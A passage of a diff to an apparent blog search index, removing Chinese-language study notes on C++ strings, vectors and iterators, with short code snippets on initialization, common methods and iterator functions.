-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">string s1;</span><br><span class="line">string s2 = &quot;hello world&quot;;</span><br><span class="line">string s3 = s2; // 存在拷贝</span><br><span class="line">string s4(&quot;hello world&quot;);</span><br><span class="line">string s5(6, &#x27;a&#x27;); // 连续6个&#x27;a&#x27;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>常用方法</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.empty()</span><br><span class="line">.size() .length()</span><br><span class="line">.c_str() // 返回一个指向string对象内部内容（正规c字符串，以&#x27;\0&#x27;结尾）的指针</span><br><span class="line">for(auto c : s) // 支持范围for，c的类型是char</span><br><span class="line">for(auto &amp;c : s) // 可以修改s中的字符</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>其它用法</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[] == &gt; &lt; + &gt;&gt; &lt;&lt;</span><br><span class="line">+ 存在隐式类型转换，可以处理混合类型</span><br><span class="line">  s1+&#x27;a&#x27; s1+&quot;a&quot;+“b&quot; 允许</span><br><span class="line">  &quot;abc&quot; + &quot;def&quot; + s2 不允许，先执行前两项的相加，但他们现在的类型无法相加</span><br><span class="line">  </span><br><span class="line">.touppper() // 针对char?</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h3><blockquote>
-<p>可变长数组</p>
-</blockquote>
-<ul>
-<li><p>不能装引用</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vector&lt;int &amp;&gt; v; // 出错，引用在需要的时候加载到寄存器中，不占用内存</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>初始化</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; strv1; <span class="comment">// string默认初值为“”，int默认初值为0</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; <span class="title function_">strv2</span><span class="params">(strv1)</span>; <span class="comment">// 存在内容拷贝 ()内部是vector时尝试拷贝，是整数时，认为是元素个数</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; <span class="title function_">strv3</span><span class="params">(<span class="number">10</span>)</span>; <span class="comment">// 10个空字符串</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; strv3 = str1; <span class="comment">// 存在内容拷贝</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; strv3 = &#123;<span class="string">&quot;aaa&quot;</span>, <span class="string">&quot;bbb&quot;</span>, <span class="string">&quot;ccc&quot;</span>&#125;; <span class="comment">// c++11，使用初始化列表 &#123;&#125;内部数据一般被认为初始化列表，如果失败，可能会尝试认为它是元素个数。</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; <span class="title function_">strv3</span><span class="params">(<span class="number">10</span>, <span class="string">&quot;abc&quot;</span>)</span>; <span class="comment">// 10个”abc</span></span><br></pre></td></tr></table></figure>
-
-
-</li>
-<li><p>常用方法</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.empty()</span><br><span class="line">.size()</span><br><span class="line">.push_back()</span><br><span class="line">.insert(place_iter, value) // 返回一个指向被插入元素的迭代器，可能和第一个参数已经不一样了</span><br><span class="line"></span><br><span class="line">.clear()</span><br><span class="line">for(auto x : v) // 支持范围for</span><br><span class="line">for(auto &amp;x : v) // 注意不要在范围for中改变vector对象的大小</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>其它用法</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[] == !=</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h3><blockquote>
-<p>标准库中的每一个容器内都定义了相应的迭代器类型（包括iterator, reverse_iterator, const_iterator)</p>
-<p>能够取代部分指针的作用，且更安全和优雅</p>
-</blockquote>
-<ul>
-<li><p>成员函数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.begin() // 返回一个指向容器第一个元素的iter  vector&lt;xxx&gt;::iterator</span><br><span class="line">.end() // 返回一个指向容器最后一个元素的后面的iter,不指向元素</span><br><span class="line">// 如果容器为空。则.begin() = .end(())</span><br><span class="line">.rbegin() // 返回一个指向容器最后一个元素的iter vector&lt;xxx&gt;::reverse_iterator</span><br><span class="line">.rend() // 返回一个指向容器第一个元素的前面的iter,不指向元素</span><br><span class="line">.cbegin() // 返回常量迭代器</span><br><span class="line">.cend() // c++ 11</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>其它用法</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">* -&gt; ++ -- == !=</span><br><span class="line">*iter : 返回iter所指向元素的 引用</span><br><span class="line">(*iter).num == iter-&gt;num : 类似指针，当迭代器iter指向结构体时，可以使用*iter返回结构提的引用，也可以直接使用iter-&gt; 访问结构体成员</span><br></pre></td></tr></table></figure></li>
-</ul>
-]]></content>
-      <categories>
-        <category>C++</category>
       </categories>
   </entry>
 </search>
